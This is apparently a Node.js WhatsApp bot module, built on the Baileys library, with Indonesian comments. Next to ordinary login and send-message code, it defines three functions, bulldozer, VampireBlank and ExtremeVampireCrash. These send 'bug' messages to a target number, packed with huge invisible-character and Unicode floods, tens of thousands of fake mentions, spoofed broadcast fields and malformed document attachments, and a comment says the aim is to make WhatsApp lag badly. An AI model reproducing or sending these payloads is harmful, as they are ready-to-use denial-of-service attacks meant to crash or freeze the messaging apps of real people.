const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys');

const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const qrcode = require('qrcode-terminal');
const path = require('path');

let sock;

global.bulldozer =async function bulldozer(target, sock) {
  const blankChar = '‎'; // karakter invisible (U+200E)
  const invisibleBomb = blankChar.repeat(150000); // bikin WA lag parah

  const unicodeMix = '𓆩𓆪🧠𓂀༒࿇'.repeat(10000);
  const fullText = `💀 𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝐁𝐋𝐀𝐍𝐊 💀\n\n${invisibleBomb}\n\n${unicodeMix}`;

  await sock.sendMessage(`${target}@s.whatsapp.net`, {
    text: fullText,
  });
}


global.VampireBlank = async function VampireBlank(target, ptcp = true) {
  const Vampire = `_*~@8~*_\n`.repeat(10500);
  const CrashNotif = 'ꦽ'.repeat(55555);

  await gulbat.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: '𝐕𝐚𝐦𝐩𝐢𝐫𝐞 𝐇𝐞𝐫𝐞' + CrashNotif + Vampire,
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
};


global.ExtremeVampireCrash = async function (target, sock) {
  const crazyText = '𓆩𓆪'.repeat(15000);
  const freezeChar = 'ꦽ'.repeat(70000);
  const mentionedList = Array.from({ length: 50000 }, () => `${Math.floor(Math.random() * 1e12)}@s.whatsapp.net`);

  const payload = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/123_fake.enc',
              mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
              fileSha256: 'fake==',
              fileLength: '999999999999999',
              mediaKey: 'invalidmediaKey==',
              fileName: 'Vᴀᴍᴘɪʀᴇ ᴄᴏʀᴇ',
              fileEncSha256: 'fake==',
              directPath: '/v/t62.7119-24/fake',
              mediaKeyTimestamp: '9999999999',
              contactVcard: true,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: `[𝐄𝐗𝐓𝐑𝐄𝐌𝐄] ᴠᴀᴍᴘɪʀᴇ 🩸 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃\n\n${freezeChar}${crazyText}`,
          },
          footer: { text: '' },
          contextInfo: {
            mentionedJid: ['0@s.whatsapp.net', ...mentionedList],
            forwardingScore: 999,
            isForwarded: true,
            quotedMessage: {
              documentMessage: {
                url: 'https://mmg.whatsapp.net/v/t62.7119-24/fake',
                mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                fileSha256: 'fake2==',
                fileLength: '999999999999',
                mediaKey: 'invalidKey==',
                fileName: 'Qᴜᴏᴛᴇᴅ Bᴜɢ',
                fileEncSha256: 'fake2==',
                directPath: '/v/t62.7119-24/fake',
                mediaKeyTimestamp: '8888888888',
                contactVcard: true,
              },
            },
            remoteJid: 'status@broadcast',
            participant: '0@s.whatsapp.net',
          },
        },
      },
    },
  };

  await sock.relayMessage(target, payload, { messageId: 'KEY' });
};

async function startBot() {
  // 🔐 Simpan sesi di folder /auth
  const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, '../auth'));

  // ✅ Ambil versi terbaru
  const { version } = await fetchLatestBaileysVersion();

  // ⚙️ Jalankan koneksi
  sock = makeWASocket({
    version,
    auth: state,
  });
  global.gulbat = sock;

  // 💾 Simpan sesi otomatis
  sock.ev.on('creds.update', saveCreds);

  // 📡 Event koneksi dan QR
  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr) {
      console.log('[BOT] Scan QR berikut untuk login:');
      qrcode.generate(qr, { small: true });
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      if (shouldReconnect) {
        console.log('[BOT] Reconnecting...');
        startBot();
      } else {
        console.log('[BOT] Disconnected. Login ulang diperlukan.');
      }
    } else if (connection === 'open') {
      console.log('[BOT] WhatsApp terhubung!');
    }
  });
}

// ✉️ Fungsi kirim pesan ke WA
async function sendMessage(jid, text) {
  if (!sock) return { success: false, error: 'SERVER belum terhubung' };

  try {
    await sock.sendMessage(jid, { text });
    return { success: true };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function getSock() {
  return sock;
}

module.exports = { startBot, sendMessage, getSock };


